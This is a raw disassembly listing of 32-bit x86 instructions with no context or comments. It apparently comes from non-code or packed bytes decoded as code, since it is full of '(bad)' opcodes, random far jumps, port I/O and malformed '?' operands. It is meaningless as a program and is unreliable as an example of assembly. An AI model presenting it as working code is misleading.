  410c01:	xchg   BYTE PTR [edi],cl
  410c03:	push   0xffffffcc
  410c05:	nop
  410c06:	sbb    dh,ch
  410c08:	enter  0x6432,0xb4
  410c0c:	or     eax,0x222d5655
  410c11:	xchg   esi,eax
  410c12:	retf   0x3ae4
  410c15:	in     al,dx
  410c16:	mov    esp,0xb474d583
  410c1b:	ins    BYTE PTR es:[edi],dx
  410c1c:	loop   0x410bb9
  410c1e:	scas   al,BYTE PTR es:[edi]
  410c1f:	or     bl,al
  410c21:	inc    edx
  410c22:	or     eax,0x26da8bcd
  410c27:	test   al,0xa8
  410c29:	mov    dh,0x2a
  410c2b:	rol    BYTE PTR [eax],cl
  410c2d:	lods   al,BYTE PTR ds:[esi]
  410c2e:	cs cwde 
  410c30:	nop
  410c31:	mov    edx,0xf005a51e
  410c36:	adc    ch,ah
  410c38:	cmp    al,0x16
  410c3a:	inc    esp
  410c3b:	cwde   
  410c3c:	jmp    0xf51bf099
  410c41:	sbb    ah,dh
  410c43:	stos   BYTE PTR es:[edi],al
  410c44:	clc    
  410c45:	push   ds
  410c46:	in     eax,dx
  410c47:	scas   al,BYTE PTR es:[edi]
  410c48:	and    dl,BYTE PTR [ebx+0x45]
  410c4b:	xchg   DWORD PTR [ebx+0x67212f0],esp
  410c51:	loop   0x410bdb
  410c53:	jbe    0x410bf5
  410c55:	jns    0x410ca8
  410c57:	inc    ebp
  410c58:	or     bh,dl
  410c5a:	mov    eax,?
  410c5c:	push   cs
  410c5d:	stc    
  410c5e:	add    BYTE PTR [eax-0xe],dh
  410c61:	rcl    DWORD PTR [eax-0x4f],0xab
  410c65:	add    BYTE PTR [eax+esi*4-0xa],dh
  410c69:	or     DWORD PTR [edx],0x5c
  410c6c:	(bad)  
  410c6d:	sbb    cl,BYTE PTR [edx+0x40844a15]
  410c73:	(bad)  
  410c74:	mov    ch,0x58
  410c76:	sub    ebx,DWORD PTR [edx]
  410c78:	ins    BYTE PTR es:[edi],dx
  410c79:	push   ebx
  410c7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c7b:	scas   al,BYTE PTR es:[edi]
  410c7c:	fs pop ebp
  410c7e:	push   ss
  410c7f:	push   0xa5ea9485
  410c84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c85:	out    0x4d,al
  410c87:	adc    eax,0x9e5e528e
  410c8c:	add    cl,ah
  410c8e:	ins    DWORD PTR es:[edi],dx
  410c8f:	cli    
  410c90:	push   esi
  410c91:	jge    0x410cdd
  410c93:	(bad)  
  410c94:	cwde   
  410c95:	addr16 call 0x9a6e:0xed4e6bfa
  410c9d:	out    0x6f,al
  410c9f:	sbb    bh,dh
  410ca1:	pushf  
  410ca2:	dec    edx
  410ca3:	add    BYTE PTR [ebx-0x68],dh
  410ca6:	add    ch,dh
  410ca8:	dec    ebp
  410ca9:	lahf   
  410caa:	inc    eax
  410cab:	adc    BYTE PTR [ebp+0x7a],dl
  410cae:	es pop esp
  410cb0:	std    
  410cb1:	pushf  
  410cb2:	xchg   ecx,eax
  410cb3:	test   eax,0x465c4841
  410cb8:	popa   
  410cb9:	inc    eax
  410cba:	xor    bh,BYTE PTR [ecx+0x49]
  410cbd:	(bad)  
  410cbe:	lods   eax,DWORD PTR ds:[esi]
  410cbf:	cbw    
  410cc1:	in     al,0xbe
  410cc3:	dec    ebx
  410cc4:	out    dx,eax
  410cc5:	stos   DWORD PTR es:[edi],eax
  410cc6:	fimul  DWORD PTR [ebp-0x6b]
  410cc9:	retf   0xf272
  410ccc:	and    eax,DWORD PTR [eax]
  410cce:	push   edx
  410ccf:	mov    BYTE PTR [edi+0x78],dl
  410cd2:	pop    esi
  410cd3:	in     eax,0x45
  410cd5:	xchg   cl,bl
  410cd7:	gs mov eax,0xb8aaac02
  410cdd:	loopne 0x410ce9
  410cdf:	and    BYTE PTR [esp+eax*1-0x64e935be],dl
  410ce6:	(bad)  
  410ce7:	push   es
  410ce8:	or     DWORD PTR [edx],0xffffffe4
  410ceb:	ret    0x56ce
  410cee:	imul   DWORD PTR [edx]
  410cf0:	pop    ebp
  410cf1:	pop    ebp
  410cf2:	sbb    eax,0x18e9f697
  410cf7:	pop    ebx
  410cf8:	jp     0x410ce6
  410cfa:	add    bl,BYTE PTR [eax+0x6a]
  410cfd:	sbb    eax,0xe6bc0d05
  410d02:	(bad)  
  410d03:	push   ebp
  410d04:	push   es
  410d05:	jecxz  0x410ca7
  410d07:	push   edx
  410d08:	xor    BYTE PTR [eax+edi*4+0x462acb],ch
  410d0f:	scas   eax,DWORD PTR es:[edi]
  410d10:	adc    BYTE PTR [ebx],cl
  410d12:	and    BYTE PTR [eax*1-0x2f533cba],dl
  410d19:	sbb    cl,BYTE PTR [esi-0x56]
  410d1c:	adc    dh,ch
  410d1e:	dec    ecx
  410d1f:	mov    al,ds:0xc2406880
  410d24:	jb     0x410d51
  410d26:	fiadd  DWORD PTR [edx+0x69f41f66]
  410d2c:	cs xor al,0xa
  410d2f:	inc    esi
  410d30:	lock and BYTE PTR [edi],0xb2
  410d34:	das    
  410d35:	mov    al,0x35
  410d37:	pop    ecx
  410d38:	imul   ebx,DWORD PTR [edx],0x6a
  410d3b:	pop    ds
  410d3c:	retf   0x56b2
  410d3f:	adc    al,bl
  410d41:	xchg   edx,eax
  410d42:	imul   edx,DWORD PTR [esi+0x19fed34c],0xffffff94
  410d49:	push   esi
  410d4a:	(bad)  
  410d4b:	shl    DWORD PTR fs:[ecx*2-0x7601fcbd],cl
  410d53:	push   es
  410d54:	mov    eax,0x34d34d0d
  410d59:	jg     0x410d15
  410d5b:	add    BYTE PTR [esi+0x8],cl
  410d5e:	add    BYTE PTR [eax-0xd8008bb],dh
  410d64:	jnp    0x410cec
  410d66:	mov    DWORD PTR [eax],0xac9c7b2e
  410d6c:	scas   eax,DWORD PTR es:[edi]
  410d6d:	out    0xd8,al
  410d6f:	and    ebp,DWORD PTR [ebx-0x4d]
  410d72:	hlt    
  410d73:	push   edx
  410d74:	or     cl,BYTE PTR [edx]
  410d76:	repz sbb BYTE PTR [esi-0x2],ah
  410d7a:	sub    BYTE PTR [edx+0x7],0x2
  410d7e:	ss in  al,dx
  410d80:	inc    edx
  410d81:	test   DWORD PTR [esi+edi*2-0x19710784],ecx
  410d88:	or     eax,0xbf7a3e2f
  410d8d:	add    ah,dh
  410d8f:	in     al,dx
  410d90:	jbe    0x410d46
  410d92:	add    al,dh
  410d94:	jb     0x410d6e
  410d96:	dec    edi
  410d97:	inc    edx
  410d98:	shl    DWORD PTR [esi-0x5f91d114],0x1e
  410d9f:	lods   al,BYTE PTR ds:[esi]
  410da0:	aam    0xe7
  410da2:	adc    BYTE PTR [ebx+eax*2+0x45],dh
  410da6:	loopne 0x410da9
  410da8:	sub    BYTE PTR ds:0x6b5a3b36,dh
  410dae:	sub    ah,ah
  410db0:	pop    es
  410db1:	cwde   
  410db2:	test   DWORD PTR [ebx+eax*1+0x70],esp
  410db6:	xchg   ecx,eax
  410db7:	scas   al,BYTE PTR es:[edi]
  410db8:	movups xmm5,xmm6
  410dbb:	cwde   
  410dbc:	fisub  DWORD PTR [esi+edx*1+0x28]
  410dc0:	or     edx,DWORD PTR [esi+ebx*4]
  410dc3:	pop    ss
  410dc4:	mov    ds:0x81ac9a16,al
  410dc9:	ja     0x410d70
  410dcb:	cs call 0x4e65:0x734301f
  410dd3:	es fs cdq 
  410dd6:	stos   BYTE PTR es:[edi],al
  410dd7:	push   eax
  410dd8:	in     al,dx
  410dd9:	push   0x26
  410ddb:	clc    
  410ddc:	retf   0xdc5e
  410ddf:	sbb    bh,ch
  410de1:	mov    ah,0xcd
  410de4:	jbe    0x410e1b
  410de6:	outs   dx,DWORD PTR ds:[esi]
  410de7:	adc    cl,0xcd
  410dea:	add    BYTE PTR [edx],ah
  410dec:	sbb    BYTE PTR [ebx+esi*2+0x16],0x4
  410df1:	(bad)  
  410df2:	cmc    
  410df3:	add    BYTE PTR [esi+0x34],dh
  410df6:	or     eax,0xae6b4ab0
  410dfb:	vpunpckhbw xmm0,xmm4,XMMWORD PTR [ebp-0x21]
  410e01:	and    al,0xc1
  410e03:	in     al,dx
  410e04:	dec    edi
  410e05:	xchg   esp,eax
  410e06:	aad    0x45
  410e08:	jnp    0x410e4d
  410e0a:	and    DWORD PTR [eax],0x5426da9c
  410e10:	pop    edi
  410e11:	add    BYTE PTR [esi+0x2db250e8],dl
  410e17:	push   eax
  410e18:	in     eax,dx
  410e19:	jp     0x410e0d
  410e1b:	xor    BYTE PTR [eax],al
  410e1d:	dec    esp
  410e1e:	sbb    cl,dh
  410e20:	and    esi,ebx
  410e22:	test   BYTE PTR [ebp+0x24],dl
  410e25:	jo     0x410e74
  410e27:	push   ebp
  410e28:	adc    eax,0x2b9c4838
  410e2d:	pushf  
  410e2e:	mov    eax,ds:0xd15e0044
  410e33:	push   esi
  410e34:	and    BYTE PTR [esi-0x5cffeafa],0xf8
  410e3b:	outs   dx,DWORD PTR ds:[esi]
  410e3c:	pop    eax
  410e3d:	aad    0x8a
  410e3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e40:	es pop eax
  410e42:	pop    esi
  410e43:	sub    cl,BYTE PTR [edx]
  410e45:	xor    edx,esi
  410e47:	mov    al,0x0
  410e49:	nop
  410e4a:	dec    eax
  410e4b:	adc    ebp,eax
  410e4d:	sub    BYTE PTR [eax],dh
  410e4f:	xchg   esi,eax
  410e50:	xchg   ebp,eax
  410e51:	mov    bl,BYTE PTR [ebp+0x14]
  410e54:	mov    ch,0x6f
  410e56:	mov    ds:0x9a3826a8,eax
  410e5b:	jl     0x410eb4
  410e5d:	enter  0x6067,0x1a
  410e61:	push   ss
  410e62:	jne    0x410ea6
  410e64:	lods   al,BYTE PTR ds:[esi]
  410e65:	add    al,dl
  410e67:	pop    ecx
  410e68:	repnz dec esp
  410e6a:	dec    esi
  410e6b:	pop    ecx
  410e6c:	add    DWORD PTR [ecx+0x78],edx
  410e6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e70:	lock into 
  410e72:	jl     0x410e26
  410e74:	fisttp DWORD PTR [esi-0x4fdfba73]
  410e7a:	mov    WORD PTR [eax+0x46],gs
  410e7d:	mov    cl,al
  410e7f:	and    ebp,DWORD PTR [eax]
  410e81:	xchg   edx,edx
  410e83:	and    BYTE PTR [esi],0x4
  410e86:	pop    ss
  410e87:	shl    bh,cl
  410e89:	arpl   WORD PTR [esi],bp
  410e8b:	fdiv   QWORD PTR ds:0x60820d19
  410e91:	test   BYTE PTR [esi+0x7195ae28],0x41
  410e98:	mov    al,ds:0x36551ca0
  410e9d:	nop
  410e9e:	jp     0x410e5e
  410ea0:	xchg   ecx,eax
  410ea1:	adc    dl,bl
  410ea3:	aad    0xfc
  410ea5:	ds cwde 
  410ea7:	mov    WORD PTR [esi+0x16f65650],es
  410ead:	test   BYTE PTR [ebp-0x77],cl
  410eb0:	mov    dl,0x0
  410eb2:	xor    BYTE PTR [esi+esi*8],bl
  410eb5:	mov    ebp,DWORD PTR [eax]
  410eb7:	sar    DWORD PTR [esi+0x70ca3475],cl
  410ebd:	add    BYTE PTR [eax+0x78],cl
  410ec0:	add    dh,al
  410ec2:	jl     0x410ec4
  410ec4:	fild   WORD PTR [eax]
  410ec6:	fiadd  DWORD PTR [edx+eax*1-0xc]
  410eca:	jmp    0xa9bc:0xd82ffea8
  410ed1:	sbb    BYTE PTR [esi+esi*2-0x36],0x7c
  410ed6:	add    BYTE PTR [eax-0x2a],bl
  410ed9:	ja     0x410e8f
  410edb:	push   ss
  410edc:	add    dl,dl
  410ede:	jb     0x410f27
  410ee0:	xchg   ecx,eax
  410ee1:	dec    edx
  410ee2:	xor    dl,BYTE PTR [edx]
  410ee4:	add    ch,BYTE PTR [eax+ebx*1-0x48]
  410ee8:	push   0x45
  410eea:	inc    ecx
  410eeb:	jmp    0x7e4b:0xe6dc685a
  410ef2:	inc    esp
  410ef3:	add    BYTE PTR ds:0x2a6a2f35,ch
  410ef9:	sbb    BYTE PTR [esi+0xe868aa6],bl
  410eff:	inc    eax
  410f00:	add    BYTE PTR [ebp+0x50227869],cl
  410f06:	sub    al,0x30
  410f08:	pop    ebp
  410f09:	repnz repz test BYTE PTR [ebx],bl
  410f0d:	push   0x2679f028
  410f12:	ror    eax,0xd1
  410f15:	in     al,0x86
  410f17:	add    al,0x30
  410f19:	fmul   QWORD PTR [edx]
  410f1b:	(bad)  
  410f1d:	adc    DWORD PTR [ebp+0x55],0x8d816dc
  410f24:	mov    eax,0x2acd6d28
  410f29:	repnz pop ds
  410f2b:	sub    BYTE PTR [esi-0x3366a798],bh
  410f31:	repz mov ds:0xa6aeea06,al
  410f37:	icebp  
  410f38:	cmp    BYTE PTR [edx],cl
  410f3a:	fadd   DWORD PTR [eax]
  410f3c:	mov    cl,0x15
  410f3e:	pop    esp
  410f3f:	mov    cl,0x79
  410f41:	aaa    
  410f42:	loopne 0x410f44
  410f44:	shr    DWORD PTR [edi+eax*4],1
  410f47:	xchg   esp,eax
  410f48:	xchg   ebx,eax
  410f49:	add    BYTE PTR [ecx],ah
  410f4b:	push   esp
  410f4c:	outs   dx,DWORD PTR ds:[esi]
  410f4d:	rcr    ah,1
  410f4f:	inc    esi
  410f50:	pop    ebx
  410f51:	push   es
  410f52:	pop    esi
  410f53:	jbe    0x410ee7
  410f55:	sbb    al,0x73
  410f57:	mov    ds:0x74d1d8e6,al
  410f5c:	cmp    BYTE PTR [eax+0x705a827c],dl
  410f62:	push   esp
  410f63:	sub    al,0x82
  410f65:	shl    DWORD PTR es:[esi+0x38299433],1
  410f6c:	xchg   BYTE PTR [ebp+eax*4-0x55e7c888],ch
  410f73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f74:	inc    edi
  410f75:	les    esi,FWORD PTR [esi-0x14]
  410f78:	or     dh,dl
  410f7a:	jge    0x410f7c
  410f7c:	fwait
  410f7d:	lea    ecx,[esi]
  410f7f:	ret    
  410f80:	dec    ecx
  410f81:	(bad)  
  410f82:	ficom  DWORD PTR [eax+0x65a656]
  410f88:	mov    ah,0x8e
  410f8a:	sub    al,bl
  410f8c:	push   ebx
  410f8d:	out    0x80,eax
  410f8f:	scas   al,BYTE PTR es:[edi]
  410f90:	pusha  
  410f91:	push   esp
  410f92:	loopne 0x410f98
  410f94:	add    DWORD PTR [eax+0x56604de9],ebp
  410f9a:	mov    eax,0xa5005423
  410f9f:	mov    al,ds:0xa6b21927
  410fa4:	jmp    0x410f3e
  410fa6:	xchg   edi,eax
  410fa7:	dec    BYTE PTR [edx+edx*4+0x5e]
  410fab:	push   eax
  410fac:	test   eax,0x8df6b8a9
  410fb1:	add    ch,al
  410fb3:	xchg   esp,eax
  410fb4:	leave  
  410fb5:	push   es
  410fb6:	(bad)  
  410fb7:	in     eax,dx
  410fb8:	add    eax,0x127ee868
  410fbd:	je     0x410f8e
  410fbf:	rcr    BYTE PTR [eax],1
  410fc1:	mov    eax,ds:0x550a3000
  410fc6:	add    BYTE PTR [edi+0x35d21d88],cl
  410fcc:	sbb    bh,BYTE PTR [esi]
  410fce:	xchg   BYTE PTR [eax-0x33],dh
  410fd1:	pop    ss
  410fd2:	mov    ch,0x2b
  410fd4:	adc    al,BYTE PTR [edx-0x61bbfff0]
  410fda:	outs   dx,BYTE PTR ds:[esi]
  410fdb:	add    BYTE PTR [ecx+edi*2],bl
  410fde:	dec    ecx
  410fdf:	add    edx,DWORD PTR [ecx-0x2f]
  410fe2:	sbb    al,0x18
  410fe4:	and    bl,ch
  410fe6:	or     bl,BYTE PTR [ebx+0x26]
  410fe9:	jp     0x411001
  410feb:	sub    cl,BYTE PTR [ecx]
  410fed:	and    BYTE PTR [esi-0x76],dh
  410ff0:	mov    WORD PTR [ecx+0x53],es
  410ff3:	imul   ebp,DWORD PTR [eax-0x76a916f4],0xffffffd0
  410ffa:	popf   
  410ffb:	lods   al,BYTE PTR ds:[esi]
  410ffc:	push   esi
  410ffd:	inc    edx
  410ffe:	scas   al,BYTE PTR es:[edi]
  410fff:	imul   esp,DWORD PTR [eax+0x41],0x69
  411003:	mov    edx,0xf35a42ef
  411008:	or     BYTE PTR [edx],cl
  41100a:	or     BYTE PTR [ebx+edx*8],dh
  41100d:	jne    0x41107e
  41100f:	fdiv   st(2),st
  411011:	jns    0x410fd1
  411013:	pop    ebx
  411014:	push   esi
  411015:	adc    eax,0xd6f88934
  41101a:	inc    edi
  41101b:	in     al,0x7
  41101d:	pusha  
  41101e:	and    DWORD PTR ds:0x4fd7000,edi
  411024:	push   es
  411025:	loope  0x411030
  411027:	outs   dx,BYTE PTR ds:[esi]
  411028:	outs   dx,DWORD PTR ds:[esi]
  411029:	push   0x96a0502a
  41102e:	mov    ds:0xb614bfe2,eax
  411033:	retf   
  411034:	add    BYTE PTR [esi+0x3556c8ad],ch
  41103a:	mov    al,0x72
  41103c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41103d:	cli    
  41103e:	hlt    
  41103f:	(bad)  
  411040:	test   eax,0x93962cb2
  411045:	push   0x45
  411047:	cwde   
  411048:	les    edi,FWORD PTR [ebp+edx*1+0x3c]
  41104c:	cmc    
  41104d:	sub    al,0xa0
  41104f:	cmp    BYTE PTR [eax+0x64],0x40
  411053:	retf   
  411054:	fsub   st,st(1)
  411056:	pop    eax
  411057:	ror    BYTE PTR [edx-0xc],1
  41105a:	nop
  41105b:	and    ch,BYTE PTR [esi+ebx*8+0x42]
  41105f:	cmc    
  411060:	jmp    0x411017
  411062:	dec    ebp
  411063:	shl    eax,cl
  411065:	push   es
  411066:	es mov dh,0xe0
  411069:	aaa    
  41106a:	leave  
  41106b:	mov    cs,WORD PTR [ebx-0x78]
  41106e:	adc    al,0xf6
  411070:	push   0x7ad6eb10
  411075:	loopne 0x411033
  411077:	mov    dl,0x41
  411079:	gs sub al,0xfe
  41107c:	or     dh,al
  41107e:	or     al,bh
  411080:	add    bh,dh
  411082:	jmp    0xf1bb888
  411087:	cld    
  411088:	mov    edx,0x6bec0410
  41108d:	or     eax,0x3016b61d
  411092:	mov    ?,esp
  411094:	jmp    0x5824:0xfa51c866
  41109b:	cmp    cl,BYTE PTR [edx-0x6155a8a6]
  4110a1:	sbb    DWORD PTR [eax-0x75e13751],esp
  4110a7:	mov    al,ds:0x9ad509b1
  4110ac:	push   ss
  4110ad:	adc    edx,DWORD PTR [esi]
  4110af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110b1:	sar    BYTE PTR [esi+0x60d55af6],1
  4110b7:	pop    esi
  4110b8:	inc    esi
  4110b9:	je     0x4110bb
  4110bb:	mov    ebx,0x18b408f2
  4110c0:	pop    es
  4110c1:	jl     0x411065
  4110c3:	stos   BYTE PTR es:[edi],al
  4110c4:	loope  0x41108f
  4110c6:	je     0x4110d4
  4110c8:	in     al,dx
  4110c9:	ret    0x719c
  4110cc:	ret    0xabb0
  4110cf:	mov    ds:0x766cc7b2,eax
  4110d4:	ret    0xec8
  4110d7:	xor    BYTE PTR [ebx+0x51],al
  4110da:	sub    BYTE PTR [esi-0x34],0xa
  4110de:	ror    BYTE PTR [eax+0x2b41600a],1
  4110e4:	stos   DWORD PTR es:[edi],eax
  4110e5:	pusha  
  4110e6:	gs ja  0x41114b
  4110e9:	dec    esi
  4110ea:	fcomp  QWORD PTR [esi]
  4110ec:	xchg   DWORD PTR [ebx+0x0],ecx
  4110ef:	sbb    eax,DWORD PTR [ebx-0x2543e527]
  4110f5:	dec    edx
  4110f6:	push   0xffffffaa
  4110f8:	push   0x4d
  4110fa:	(bad)  
  4110fc:	loop   0x41114c
  4110fe:	dec    esi
  4110ff:	rcr    BYTE PTR [ebx+eax*2],1
  411102:	imul   ebx,DWORD PTR [edx-0x2a01165a],0xcb5dce40
  41110c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41110d:	imul   ebx,DWORD PTR [edx+0x57c45aa6],0xa6b55cc1
  411117:	stc    
  411118:	fwait
  411119:	xor    ah,BYTE PTR [ecx+0x423700c4]
  41111f:	add    BYTE PTR [esi-0x24d70ec8],ah
  411125:	cli    
  411126:	ins    BYTE PTR es:[edi],dx
  411127:	in     al,dx
  411128:	mov    al,0xb2
  41112a:	pop    edx
  41112b:	aaa    
  41112c:	pop    ebp
  41112d:	bound  ebp,QWORD PTR [edx]
  41112f:	add    al,0xe6
  411131:	sub    DWORD PTR [ebp-0x4a],ecx
  411134:	sub    DWORD PTR [edx+ebp*8+0x25db8e8],esp
  41113b:	lods   al,BYTE PTR ds:[esi]
  41113c:	adc    BYTE PTR [ecx-0x18],ah
  41113f:	call   0xe3d91eac
  411144:	fsub   QWORD PTR [ebp+0x2a]
  411147:	out    0x54,eax
  411149:	imul   ebx,DWORD PTR [edx],0x9aaa6b50
  41114f:	jmp    0x41117f
  411151:	ins    DWORD PTR es:[edi],dx
  411152:	call   0x9a87:0x79b48eef
  411159:	cmp    al,0xc3
  41115b:	xchg   ebx,eax
  41115c:	add    BYTE PTR [edx],ch
  41115e:	sar    cl,0x26
  411161:	int    0x20
  411163:	add    cl,BYTE PTR [edx+0x74ace6ba]
  411169:	retf   0x680a
  41116c:	cmp    BYTE PTR [esi+0x5b],al
  41116f:	test   al,0x45
  411171:	push   esi
  411172:	xor    al,0x6f
  411174:	xor    al,0xcf
  411176:	loopne 0x4111c3
  411178:	jecxz  0x41119e
  41117a:	in     eax,dx
  41117b:	push   0x4966c9b6
  411180:	inc    edi
  411181:	shr    BYTE PTR [esi-0x28],1
  411184:	mov    cl,BYTE PTR [edx]
  411186:	not    bl
  411188:	rcl    BYTE PTR [ecx+0x59],1
  41118b:	lods   al,BYTE PTR ds:[esi]
  41118c:	jbe    0x41115b
  41118e:	pop    edx
  41118f:	jnp    0x411132
  411191:	push   esp
  411192:	pop    esi
  411193:	pop    ecx
  411194:	push   ebx
  411195:	lods   al,BYTE PTR ds:[esi]
  411196:	dec    esp
  411197:	mov    eax,0x6140c46e
  41119c:	rol    esp,1
  41119e:	sub    BYTE PTR [ebp+0x4c],0xef
  4111a2:	dec    edx
  4111a3:	mov    eax,0xcc697086
  4111a8:	rol    BYTE PTR [ebx],1
  4111aa:	jne    0x411158
  4111ac:	push   eax
  4111ad:	adc    bl,dh
  4111af:	ss xor al,0xef
  4111b2:	pop    edx
  4111b3:	ror    DWORD PTR [edi+edi*8+0x7c],1
  4111b7:	jge    0x411235
  4111b9:	(bad)  
  4111ba:	pop    ecx
  4111bb:	add    BYTE PTR [ecx+0x7b],bh
  4111be:	and    al,0x57
  4111c0:	xchg   ebx,eax
  4111c1:	jns    0x411196
  4111c3:	push   es
  4111c4:	pop    edi
  4111c5:	add    BYTE PTR [ecx+0x328d3a3d],al
  4111cb:	test   al,0x79
  4111cd:	inc    ecx
  4111ce:	push   ebp
  4111cf:	or     esp,DWORD PTR [ecx+ecx*4]
  4111d2:	jle    0x4111eb
  4111d4:	dec    eax
  4111d5:	add    BYTE PTR [ebp+0x4d056513],dl
  4111db:	push   es
  4111dc:	pop    edx
  4111dd:	jbe    0x4111fe
  4111df:	(bad)  
  4111e0:	popf   
  4111e1:	dec    esp
  4111e2:	popa   
  4111e3:	sub    ebp,DWORD PTR [eax+0x36]
  4111e6:	pop    eax
  4111e7:	cdq    
  4111e8:	jle    0x411211
  4111ea:	jo     0x411191
  4111ec:	push   ds
  4111ed:	das    
  4111ee:	clc    
  4111ef:	xor    bh,BYTE PTR [esi+0x18]
  4111f2:	mov    eax,ds:0x7ead9a15
  4111f7:	sub    edi,DWORD PTR [ebp+0x0]
  4111fa:	test   eax,0x36a0baaa
  4111ff:	aaa    
  411200:	pusha  
  411201:	add    BYTE PTR [ebx],dh
  411203:	inc    edx
  411204:	mov    cl,0xed
  411206:	sub    BYTE PTR [eax],ch
  411208:	test   al,0x36
  41120a:	aas    
  41120b:	add    BYTE PTR [ebp-0x465dc410],bh
  411211:	or     eax,DWORD PTR [ecx]
  411213:	jbe    0x4111fd
  411215:	dec    esp
  411216:	retf   0x43c6
  411219:	(bad)  
  41121a:	push   ss
  41121b:	xor    al,BYTE PTR ds:0xd0ed4c2b
  411221:	int    0xe0
  411223:	test   BYTE PTR [ebp+0x28dc0b4c],al
  411229:	out    0x57,al
  41122b:	(bad)  
  41122c:	fcom   DWORD PTR [ebx-0x65]
  41122f:	xchg   esp,eax
  411230:	xor    al,0x45
  411232:	sbb    eax,0x44963a04
  411237:	hlt    
  411238:	xchg   ecx,eax
  411239:	shl    ebp,1
  41123b:	add    BYTE PTR [ebp+0x4],dl
  41123e:	repz mov ah,ch
  411241:	and    BYTE PTR [ebx-0x2f],0xe
  411245:	pop    es
  411246:	push   esp
  411247:	(bad)  
  411248:	loope  0x4111ea
  41124a:	mov    ds:0xa280c8ed,al
  41124f:	mov    ds,WORD PTR [edi+0x50]
  411252:	lods   eax,DWORD PTR ds:[esi]
  411253:	cmp    al,0x77
  411255:	mov    ch,0x84
  411257:	xlat   BYTE PTR ds:[ebx]
  411258:	dec    edx
  411259:	out    0x5d,al
  41125b:	pop    ebp
  41125c:	or     eax,0x7fb0f1f8
  411261:	push   esi
  411262:	std    
  411263:	mov    eax,ds:0xd71d7b00
  411268:	les    ecx,FWORD PTR [edx-0x678ad07]
  41126e:	push   ss
  41126f:	and    DWORD PTR [eax+0x1],0xffffffd5
  411273:	mov    ch,0xb4
  411275:	loope  0x411255
  411277:	add    BYTE PTR [edi+0x5ed50d68],cl
  41127d:	or     DWORD PTR [edx+0x16],ebx
  411280:	mov    al,ds:0xa0975379
  411285:	adc    eax,0x119300cf
  41128a:	sub    BYTE PTR [edi+0x3c7018eb],bl
  411290:	es jmp 0x5b44:0xa72ee9b
  411298:	xchg   ecx,eax
  411299:	es ds and eax,0xaad4a3ca
  4112a0:	sub    ch,BYTE PTR [edi-0x74a71c53]
  4112a6:	sub    al,0x2d
  4112a8:	std    
  4112a9:	inc    edx
  4112aa:	sub    edx,ebp
  4112ac:	mov    bh,0x88
  4112ae:	xor    eax,0x6f35aa42
  4112b3:	xchg   esp,eax
  4112b4:	mov    bl,0xde
  4112b6:	add    BYTE PTR [ecx],dh
  4112b8:	mov    edi,0xd3fc3d46
  4112bd:	xor    al,0x14
  4112bf:	sbb    ah,dl
  4112c1:	idiv   dh
  4112c3:	das    
  4112c4:	or     eax,0x4d34099f
  4112c9:	sub    cl,BYTE PTR [eax]
  4112cb:	and    eax,0x4d20cbc6
  4112d0:	shl    DWORD PTR [ecx*1+0x113302fe],cl
  4112d7:	ss adc al,0x1b
  4112da:	pop    edx
  4112db:	lods   eax,DWORD PTR ds:[esi]
  4112dc:	xor    BYTE PTR [esi],ch
  4112de:	pop    ecx
  4112df:	jo     0x411278
  4112e1:	pop    ebp
  4112e2:	sub    al,0xf5
  4112e4:	pop    eax
  4112e5:	call   0xe9ec:0xf20c1a9a
  4112ec:	jl     0x411353
  4112ee:	hlt    
  4112ef:	in     al,dx
  4112f0:	popa   
  4112f1:	fwait
  4112f2:	sub    ch,BYTE PTR [edx-0xf7789b8]
  4112f8:	lods   al,BYTE PTR ds:[esi]
  4112f9:	jb     0x41133e
  4112fb:	push   ss
  4112fc:	adc    BYTE PTR [edi],bl
  4112fe:	ficom  DWORD PTR [eax+0x2e]
  411301:	outs   dx,BYTE PTR ds:[esi]
  411302:	in     al,dx
  411303:	call   0xd125974f
  411308:	mov    al,ds:0x4cbc9a00
  41130d:	loopne 0x41131b
  41130f:	in     al,dx
  411310:	sbb    al,0x78
  411312:	ror    BYTE PTR [esi],0x13
  411315:	in     al,0xd8
  411317:	sbb    BYTE PTR [ebx],dh
  411319:	pushf  
  41131a:	adc    al,0x68
  41131c:	xchg   ebx,eax
  41131d:	inc    ecx
  41131e:	call   0xe2a7a935
  411323:	xchg   edx,eax
  411324:	sub    eax,DWORD PTR [eax+ebp*8]
  411327:	push   edx
  411328:	xor    DWORD PTR [eax+eiz*8-0x72],0xffffffec
  41132d:	aas    
  41132e:	jo     0x411371
  411330:	xor    ebp,DWORD PTR [edi+0x32044cda]
  411336:	mov    ah,0x40
  411338:	add    BYTE PTR [eax],al
  41133a:	xor    eax,0x740c3c7c
  41133f:	pop    esp
  411340:	bound  eax,QWORD PTR [ebx-0x42]
  411343:	in     al,dx
  411344:	cmp    BYTE PTR [ebx],cl
  411346:	test   BYTE PTR [esp+edi*1],dh
  411349:	mov    dh,0xa8
  41134b:	ds add al,bl
  41134e:	xor    BYTE PTR [ecx],al
  411350:	repnz sub al,0x1c
  411353:	push   ds
  411354:	push   ss
  411355:	or     al,BYTE PTR ds:0x9628ec34
  41135b:	gs xor eax,0xe2f8af34
  411361:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411362:	out    dx,al
  411363:	and    BYTE PTR ds:0xe05ca200,bl
  411369:	fidiv  WORD PTR [esp+esi*1]
  41136c:	je     0x4113a3
  41136e:	mov    ds,WORD PTR [eax-0x2c]
  411371:	fidivr DWORD PTR [esp+edx*2+0x6cc1d602]
  411378:	fmul   QWORD PTR [eax-0x34]
  41137b:	jmp    0xbc8de580
  411380:	ret    0xa02c
  411383:	loopne 0x411353
  411385:	and    ch,BYTE PTR [esi]
  411387:	retf   0x9d
  41138a:	inc    esp
  41138b:	xchg   ecx,eax
  41138c:	adc    ch,BYTE PTR [edx-0x22]
  41138f:	(bad)  
  411390:	nop
  411391:	add    BYTE PTR [eax-0x3e],al
  411394:	dec    esi
  411395:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411396:	mov    edx,0xfe436aa9
  41139b:	in     al,dx
  41139c:	js     0x411359
